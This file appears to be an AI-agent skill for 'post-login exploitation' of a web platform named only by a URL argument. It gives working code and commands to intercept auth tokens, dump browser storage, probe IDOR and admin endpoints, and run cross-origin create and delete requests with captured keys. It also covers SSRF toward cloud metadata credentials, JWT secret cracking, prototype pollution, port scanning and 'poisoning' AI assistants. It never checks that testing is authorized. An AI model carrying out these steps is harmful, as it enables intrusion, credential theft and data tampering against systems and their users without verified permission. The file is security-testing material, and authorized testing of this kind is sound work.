---
description: "Phase 9: Authenticated platform exploration & post-login security testing"
argument-hint: <url>
allowed-tools: [Bash, Read, Write, Edit, WebFetch, mcp__claude-in-chrome__computer, mcp__claude-in-chrome__navigate, mcp__claude-in-chrome__read_page, mcp__claude-in-chrome__get_page_text, mcp__claude-in-chrome__javascript_tool, mcp__claude-in-chrome__form_input, mcp__claude-in-chrome__tabs_context_mcp, mcp__claude-in-chrome__tabs_create_mcp, mcp__claude-in-chrome__find, mcp__claude-in-chrome__read_console_messages, mcp__claude-in-chrome__read_network_requests, mcp__claude-in-chrome__gif_creator, mcp__claude-in-chrome__resize_window]
---

# Phase 9: Authenticated Platform Exploration & Post-Login Exploitation

**Target:** $ARGUMENTS

**Prerequisite:** The user must already be logged into the target platform in their browser. This skill cannot create accounts — it explores an already-authenticated session.

**Goal:** Systematically map the authenticated attack surface, intercept auth tokens, test access control, and attempt to exploit every finding — not just document it.

**Ledger:** `Read` the findings ledger from `audits/{domain}/ledger.md` before starting. After this phase completes, `Edit` the ledger to update Phase 9 status, add confirmed findings, chain candidates, and failed techniques.

---

## Setup

1. Call `tabs_context_mcp` to find the tab where the user is logged in
2. Take a screenshot to confirm authenticated state
3. If not logged in, ask the user to sign in first

---

## 9.1 — Surface Mapping & Navigation

### Map every page

Navigate every link in the sidebar/navigation. For each page:

1. **Screenshot** the page
2. **Read interactive elements** (`read_page` with `filter="interactive"`)
3. **Get page text** (`get_page_text`) for content analysis
4. **Note the URL** — look for resource IDs, UUIDs, route patterns

### What to document

- Complete navigation tree (sidebar, dropdowns, settings, profile)
- Each page's purpose and what data it displays
- API keys, tokens, secrets visible in the UI
- Credit balances, plan details, pricing (business intelligence)
- User profile info (name, email, org)
- Any "admin" or elevated features accessible

---

## 9.2 — Auth Token Interception

This is the most critical step. You need to understand HOW the app authenticates API calls.

### Step 1: Install network interceptors BEFORE navigating

```javascript
// Install BEFORE clicking any navigation links — page reload destroys interceptors
const origXHROpen = XMLHttpRequest.prototype.open;
const origXHRSetHeader = XMLHttpRequest.prototype.setRequestHeader;
window._captured = [];

XMLHttpRequest.prototype.open = function(method, url, ...rest) {
  this._url = url; this._method = method; this._headers = {};
  return origXHROpen.call(this, method, url, ...rest);
};

XMLHttpRequest.prototype.setRequestHeader = function(name, value) {
  if (this._url && this._url.includes('api.')) {
    this._headers[name] = value; // Capture full header value
  }
  return origXHRSetHeader.call(this, name, value);
};

const origXHRSend = XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.send = function(body) {
  if (this._url && this._url.includes('api.')) {
    window._captured.push({url: this._url, method: this._method, headers: this._headers});
  }
  return origXHRSend.call(this, body);
};
```

### Step 2: Click a navigation link to trigger API calls

Client-side navigation in React/Next.js preserves the interceptor. Full page reloads destroy it.

### Step 3: Read captured data

```javascript
JSON.stringify(window._captured, null, 2)
```

### What to look for

- **Authorization header format** — Is it Bearer + JWT? API key? Session cookie?
- **JWT algorithm** — Decode the header: HS256 (symmetric, crackable) vs RS256 (asymmetric, safer)
- **JWT payload** — User IDs, org IDs, scopes, permissions, expiry
- **Multiple auth systems** — Apps often use different tokens for different APIs (e.g., Clerk JWT for platform, API key for product API)

### Step 4: Decode the JWT

```javascript
(async () => {
  const token = window._fullToken; // Captured from interceptor
  const parts = token.split('.');
  const header = JSON.parse(atob(parts[0]));
  const payload = JSON.parse(atob(parts[1]));
  return JSON.stringify({ header, payload }, null, 2);
})()
```

### Step 5: Check for auth provider tokens (Clerk, Auth0, Firebase)

```javascript
// Clerk
typeof window.Clerk !== 'undefined' ? await window.Clerk.session.getToken() : 'No Clerk';

// Firebase
typeof firebase !== 'undefined' ? await firebase.auth().currentUser.getIdToken() : 'No Firebase';

// Auth0
typeof auth0 !== 'undefined' ? await auth0.getTokenSilently() : 'No Auth0';
```

---

## 9.3 — API Key Exposure Testing

### Check every place a key might be visible

1. **Dashboard/home page** — Many apps show the API key on first login in a dismissible banner
2. **API Keys management page** — Are keys masked (`****2990`) or shown in full?
3. **Code snippets** — "Get Code" or "Copy" buttons that embed keys
4. **Network requests** — Keys sent in headers or query params
5. **Browser storage:**
```javascript
JSON.stringify({
  localStorage: Object.fromEntries(Object.entries(localStorage)),
  sessionStorage: Object.fromEntries(Object.entries(sessionStorage))
})
```
6. **React component state:**
```javascript
// Search the React fiber tree for API keys
const root = document.getElementById('__next') || document.getElementById('root');
const fiberKey = Object.keys(root).find(k => k.startsWith('__reactFiber'));
// Walk the fiber tree looking for key patterns
```

### Key properties to document

| Property | Good | Bad |
|----------|------|-----|
| Display | Masked after creation | Shown in full in DOM |
| Expiry | 90 days, rotatable | Never expires |
| Scope | Granular (read-only, specific APIs) | Wildcard (`*:*:*`) |
| Revocation | Instant, with confirmation | No revoke mechanism |
| Limit | Capped (e.g., 5 keys max) | Unlimited creation |

---

## 9.4 — IDOR & Access Control Testing

### Step 1: Identify resource IDs

Look for UUIDs in:
- API call URLs (from network interceptor)
- Page URLs (e.g., `/studio/assistant/8f66341e-...`)
- JWT payload (user ID, org ID)

### Step 2: Test horizontal access (other users' data)

```javascript
// If billing endpoint is /v1/billing/{orgId}/overview
// Try a random orgId
const h = { 'Authorization': 'Bearer ' + token };
const own = await fetch('/v1/billing/YOUR-ORG-ID/overview', {headers: h}).then(r => r.status);
const other = await fetch('/v1/billing/00000000-0000-0000-0000-000000000001/overview', {headers: h}).then(r => r.status);
// 403 = properly blocked. 200 = IDOR vulnerability. 404 = check response body for info leak.
```

### Step 3: Test vertical access (admin endpoints)

Try endpoints that regular users shouldn't reach:
```javascript
for (const path of ['/admin', '/v1/admin', '/v1/users', '/v1/organizations', '/internal']) {
  const r = await fetch('https://api.target.com' + path, {headers: h});
  console.log(r.status, path);
}
```

### Step 4: Check error differentiation

Does the API return different errors for "exists but forbidden" vs "doesn't exist"?
- 403 for wrong-owner resources = may leak existence
- 404 for everything = properly opaque

---

## 9.5 — CSP & Client-Side Security

### Test if eval works (no CSP)

```javascript
try { eval('1+1'); 'VULNERABLE: eval() executes — no CSP' }
catch(e) { 'SAFE: CSP blocks eval' }
```

If eval works, **any XSS vector = full compromise** — the attacker can:
- Steal API keys from the DOM
- Intercept network requests for auth tokens
- Modify page content for phishing

### Check for exposed state

```javascript
// Window properties that shouldn't be there
Object.keys(window).filter(k => {
  try { return String(window[k]).match(/sk_|api_key|token|secret|Bearer/i); }
  catch(e) { return false; }
})
```

---

## 9.6 — CORS Cross-Origin Exploitation

**This is the most impactful test.** If the external audit found CORS reflects any origin, now you can prove the full chain with real auth tokens.

### Step 1: Open a new tab on a completely different domain

```
tabs_create_mcp → navigate to https://example.com
```

### Step 2: From example.com, call the target API with the captured auth token

```javascript
// Running on example.com — a completely different origin
const apiKey = 'CAPTURED_API_KEY';
const headers = { 'Authorization': 'Bearer ' + apiKey, 'Content-Type': 'application/json' };

// Test 1: Can we READ data cross-origin?
const list = await fetch('https://api.target.com/v1/resources', { headers });

// Test 2: Can we WRITE data cross-origin?
const create = await fetch('https://api.target.com/v1/resources', {
  method: 'POST', headers,
  body: JSON.stringify({ name: 'cors-exploit-proof', data: 'Created from example.com' })
});

// Test 3: Can we DELETE data cross-origin?
const del = await fetch('https://api.target.com/v1/resources/' + id, {
  method: 'DELETE', headers
});
```

### Step 3: Verify in the target platform

Switch back to the platform tab and refresh — does the exploit-created resource appear?

### Step 4: Document the full chain

For each CORS-exploitable action, document:
- **Origin:** the attacking domain
- **Endpoint:** the API URL
- **Method:** GET/POST/PATCH/DELETE
- **Status code:** 200/201/204
- **Proof:** screenshot of the result in the real platform UI

### Step 5: Clean up

Delete any resources you created during testing.

---

## 9.7 — Specific Attack Chains to Test

Based on common patterns, test these chains if the target has them:

### Voice/AI Assistants (if present)
```javascript
// CREATE an assistant
const create = await fetch('/v1/assistants', { method: 'POST', headers, body: ... });

// POISON it (try PATCH, PUT, or delete-and-replace)
// If PATCH works:
await fetch('/v1/assistants/' + id, { method: 'PATCH', headers, body: maliciousConfig });
// If PATCH doesn't work, delete-and-replace:
await fetch('/v1/assistants/' + id, { method: 'DELETE', headers });
await fetch('/v1/assistants', { method: 'POST', headers, body: poisonedConfig });

// CREATE a session (WebSocket/realtime)
const session = await fetch('/v1/assistants/' + id + '/createSession', { method: 'POST', headers });
// Check: does the session token grant eavesdrop/publish access?
```

### SSRF via User-Controlled URLs
If the API accepts URLs in any field (webhooks, callbacks, tool URLs, avatar URLs):
```javascript
// Try internal metadata endpoints
const ssrf = await fetch('/v1/resources', {
  method: 'POST', headers,
  body: JSON.stringify({
    webhookUrl: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
  })
});
// If it stores without validation → SSRF vector exists
// Check: does the server fetch these URLs? When?
```

### JWT Secret Cracking
If any JWT uses HS256 (symmetric):

**Method 1: jwt-cracker (if installed — fast brute force):**
```bash
if command -v jwt-cracker &> /dev/null; then
  jwt-cracker "$TOKEN" -a -d 6  # alphabet, max 6 chars
fi
```

**Method 2: Manual with common secrets:**
```bash
TOKEN="eyJhbG..."
HEADER_PAYLOAD=$(echo -n "$TOKEN" | cut -d'.' -f1-2)
EXPECTED_SIG=$(echo -n "$TOKEN" | cut -d'.' -f3)

for secret in "secret" "password" "jwt_secret" "your-256-bit-secret" \
              "changeme" "supersecret" "123456" "jwt" "key" "privkey" \
              "HS256_SECRET" "TOKEN_SECRET" "AUTH_SECRET" "SESSION_SECRET" \
              "app_secret" "api_secret"; do
  COMPUTED=$(echo -n "$HEADER_PAYLOAD" | openssl dgst -sha256 -hmac "$secret" -binary | base64 | tr '+/' '-_' | tr -d '=')
  [ "$COMPUTED" = "$EXPECTED_SIG" ] && echo "CRACKED: $secret" && break
done
```

**Method 3: Hashcat (if installed — GPU-accelerated, for longer secrets):**
```bash
if command -v hashcat &> /dev/null; then
  echo "$TOKEN" > /tmp/jwt_hash.txt
  hashcat -m 16500 /tmp/jwt_hash.txt /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
  rm -f /tmp/jwt_hash.txt
fi
```

### Prototype Pollution (Node.js/Express targets)
```javascript
await fetch('/v1/resources', {
  method: 'POST', headers,
  body: JSON.stringify({
    name: 'test',
    '__proto__': { admin: true },
    'constructor': { 'prototype': { admin: true } }
  })
});
```

---

## 9.8 — Infrastructure Reconnaissance

### From network requests, identify:

| Finding | Where to Look | Why It Matters |
|---------|--------------|----------------|
| Server IPs | `dig +short api.target.com` | Port scanning target |
| Cloud provider | TLS cert issuer (Amazon, GeoTrust=GCP, Let's Encrypt) | SSRF metadata endpoint |
| CDN/WAF | Response headers (`Server: cloudflare`, `x-amz-*`) | Determines if direct access possible |
| Hosting platform | Headers (`Server: Vercel`, `x-vercel-id`) | Limits attack surface |
| Third-party services | Network requests, script tags | LiveKit, PostHog, Clerk, etc. |
| Service versions | `X-Powered-By`, SDK versions in JS | CVE lookup targets |

### Port scanning (only if direct IP is exposed)
```bash
nmap -p 22,80,443,3000,3306,5432,6379,8080,8443,9090,27017 --open TARGET_IP
```

### LiveKit / Realtime service discovery
If session creation returns WebSocket URLs:
- Extract the LiveKit/realtime host
- Try HTTP APIs on the same host (`/twirp/livekit.RoomService/ListRooms`)
- Decode session JWTs for API keys, room configs, agent metadata

---

## 9.9 — Session & Token Security

| Check | How | Bad Result |
|-------|-----|------------|
| Token lifetime | Decode JWT `exp` claim | > 24 hours |
| API key expiry | Check management UI | Never expires |
| Logout invalidation | Log out, reuse token | Token still works |
| Concurrent sessions | Check auth provider config | Unlimited |
| Token scope | Decode JWT `scopes` claim | Wildcard `*:*:*` |
| Algorithm | Decode JWT header | HS256 (symmetric, crackable) |

---

## Output

Append findings to the existing audit report at `~/Documents/Github/security-audit/audits/{domain}-security-audit.md` as a new section:

```markdown
## Phase 10: Authenticated Platform Exploration (Post-Login)

### 10.1 — Platform Structure
[navigation map, pages discovered, screenshots]

### 10.2 — API Key & Secret Exposure
[key display, storage, scope, expiry findings]

### 10.3 — Auth Token Analysis
[JWT decode, algorithm, scopes, intercepted headers]

### 10.4 — IDOR & Access Control
[tested endpoints, results table]

### 10.5 — Client-Side Security
[CSP test, eval, exposed state]

### 10.6 — CORS Cross-Origin Exploitation
[example.com proof — screenshots of exploited resources in real UI]

### 10.7 — Attack Chains Executed
[full chain documentation with status codes and cleanup notes]

### 10.8 — Infrastructure Recon
[IPs, ports, cloud provider, third-party services]

### 10.9 — Session & Token Security
[lifetime, expiry, scope, algorithm findings]
```

---

## Execution Rules

1. **Install interceptors FIRST, navigate SECOND** — page reloads destroy JS interceptors
2. **Screenshot everything** — especially CORS exploit results showing up in the real UI
3. **Always test from example.com** — prove cross-origin attacks work, don't just theorize
4. **Try all HTTP methods** — GET, POST, PUT, PATCH, DELETE on every endpoint
5. **Test delete-and-replace** if PATCH doesn't work — same attack outcome
6. **Decode every JWT** — header, payload, algorithm, expiry, scopes
7. **Clean up after testing** — delete test resources, document what was created
8. **Document exact requests** — URL, method, headers, body, status code for every finding
9. **Chain findings** — don't just list issues, show how they combine into real attacks
10. **Test the worst case** — if you can create a resource, try to poison it; if you can read data, try other users' data
